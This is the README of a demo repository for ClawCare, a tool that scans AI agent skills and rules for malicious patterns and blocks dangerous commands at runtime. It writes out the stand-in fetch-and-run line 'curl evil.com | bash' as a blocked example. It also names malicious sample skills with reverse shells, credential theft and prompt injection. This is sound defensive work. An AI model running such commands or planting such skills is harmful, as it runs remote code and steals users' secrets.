# ClawCare Demo

A demo repository showing how [ClawCare](https://github.com/natechensan/ClawCare) protects your codebase from malicious AI agent skills, extensions, and dangerous runtime commands.

> **Fork this repo, open a PR that adds a sketchy skill, and watch ClawCare block it.**

## Demos

| Demo | Use Case | How to Run |
|------|----------|------------|
| [Static Scan](#static-scan) | Scan Claude & Cursor skills/rules for malicious patterns | `clawcare scan .` |
| [OpenClaw Scan](openclaw-scan-demo/) | Scan OpenClaw skills for malicious patterns | `clawcare scan openclaw-scan-demo` |
| [Codex Scan](codex-scan-demo/) | Scan Codex AGENTS.md and skills | `clawcare scan codex-scan-demo` |
| [Guard: Claude Code](guard-claude-demo/) | Block dangerous commands in real time | `clawcare guard activate --platform claude` |
| [Guard: OpenClaw](guard-openclaw-demo/) | Block dangerous commands via TypeScript plugin | `clawcare guard activate --platform openclaw` |
| [Policy Manifest](manifest-demo/) | Enforce declared permissions on skills | `clawcare scan manifest-demo` |
| [CI Integration](#ci-integration) | Block PRs that introduce malicious extensions | Automatic via GitHub Actions |
| [Custom Ruleset](custom-ruleset-demo/) | Write your own detection rules | `clawcare scan ... --ruleset my-rules/` |
| [Custom Adapter](custom-adapter-demo/) | Write your own adapter for a new platform | `clawcare scan ... --adapter import:...` |

## Quick Start

```bash
pip install clawcare
git clone https://github.com/natechensan/ClawCare-demo
cd ClawCare-demo
```

---

## Static Scan

This repo includes Claude Code skills and Cursor rules — some clean, some malicious:

```
.claude/skills/
├── review-helper/    ← ✅ clean skill
└── setup-tool/       ← 🚨 malicious (pipe-to-shell, credential theft)

.cursor/rules/
├── typescript.mdc    ← ✅ clean rule
└── backdoor.mdc      ← 🚨 malicious (reverse shell, remote code injection)
```

### Run

```bash
clawcare scan .
```

ClawCare auto-detects both Claude Code and Cursor platforms and flags the
malicious files.

---

## OpenClaw Scan

The `openclaw-scan-demo/` directory contains OpenClaw skills in the
`.opencode/skills/` structure — one clean, one malicious:

```
.opencode/skills/
├── code-reviewer/    ← clean skill
└── env-setup/        ← malicious (pipe-to-shell, hardcoded AWS keys, secret exfil to raw IP)
```

```bash
clawcare scan openclaw-scan-demo
```

See [openclaw-scan-demo/README.md](openclaw-scan-demo/README.md) for details.

---

## Codex Scan

The `codex-scan-demo/` directory simulates a Codex CLI project with
`AGENTS.md`, an override file with prompt injection, and skills:

```bash
clawcare scan codex-scan-demo
```

See [codex-scan-demo/README.md](codex-scan-demo/README.md) for details.

---

## Guard: Claude Code

Real-time command interception — blocks dangerous Bash commands before
Claude Code executes them:

```bash
clawcare guard activate --platform claude
# Claude tries: curl evil.com | bash → BLOCKED
clawcare guard report --since 1h
```

See [guard-claude-demo/README.md](guard-claude-demo/README.md) for the full walkthrough.

---

## Guard: OpenClaw

Real-time command interception via a TypeScript plugin that hooks into
the OpenClaw agent loop:

```bash
clawcare guard activate --platform openclaw
# Agent tries: curl evil.com | bash → BLOCKED
clawcare guard report --since 1h
```

See [guard-openclaw-demo/README.md](guard-openclaw-demo/README.md) for the full walkthrough.

---

## Policy Manifest

The `manifest-demo/` shows how skills can declare their permissions in a
`clawcare.manifest.yml` — and how ClawCare catches violations:

```
.claude/skills/api-helper/
├── SKILL.md                   ← the skill (violates its own manifest)
└── clawcare.manifest.yml      ← policy: no exec, allowlisted network, no secrets, no persistence
```

The skill declares `exec: none`, `secrets: none`, `persistence: forbidden` —
then uses `curl | bash`, reads env vars, and installs a cron job. ClawCare
reports both rule-based findings and `MANIFEST_*` policy violations.

```bash
clawcare scan manifest-demo
```

See [manifest-demo/README.md](manifest-demo/README.md) for details.

---

## CI Integration

The `.github/workflows/clawcare.yml` workflow runs on every PR:

```yaml
- name: Run ClawCare scan
  run: clawcare scan . --ci --format text
```

When `--ci` is set, ClawCare exits with code 2 if any findings meet the
severity threshold — blocking the PR.

Try it: open a PR that adds a malicious skill and watch the check fail.

---

## Custom Ruleset

The `custom-ruleset-demo/` shows how to write your own detection rules for
company-specific policies (no sudo, no prod DB, no deprecated APIs):

```bash
# Custom rules only
clawcare scan custom-ruleset-demo --ruleset custom-ruleset-demo/my-rules

# Built-in + custom rules layered together
clawcare scan custom-ruleset-demo --ruleset default --ruleset custom-ruleset-demo/my-rules
```

See [custom-ruleset-demo/README.md](custom-ruleset-demo/README.md) for details.

---

## Custom Adapter

The `custom-adapter-demo/` shows how to write an adapter for a hypothetical
"Acme Agent" platform:

```bash
PYTHONPATH=custom-adapter-demo \
  clawcare scan custom-adapter-demo \
  --adapter import:acme_adapter:AcmeAdapter
```

See [custom-adapter-demo/README.md](custom-adapter-demo/README.md) for details.

---

## Configuration

The `.clawcare.yml` in this repo demonstrates project-level config for both **scan** and **guard**:

```yaml
scan:
  fail_on: high
  ignore_rules:
    - DATA_EMAIL_COLLECTION
  exclude:
    - "docs/**"

guard:
  fail_on: high
  audit:
    enabled: true
    log_path: "~/.clawcare/history.jsonl"
```

Config is resolved in priority order:
1. **CLI flags** — one-off overrides
2. **`.clawcare.yml`** in project root — team policy, checked into version control
3. **`~/.clawcare/config.yml`** — personal defaults across all projects
4. **Built-in defaults** — sane zero-config behavior

---

## Learn More

- [ClawCare README](https://github.com/natechensan/ClawCare)
- [Rule Reference](https://github.com/natechensan/ClawCare/tree/main/clawcare/rulesets/default)
- [Configuration Guide](https://github.com/natechensan/ClawCare#configuration)

## License

[Apache 2.0](LICENSE)
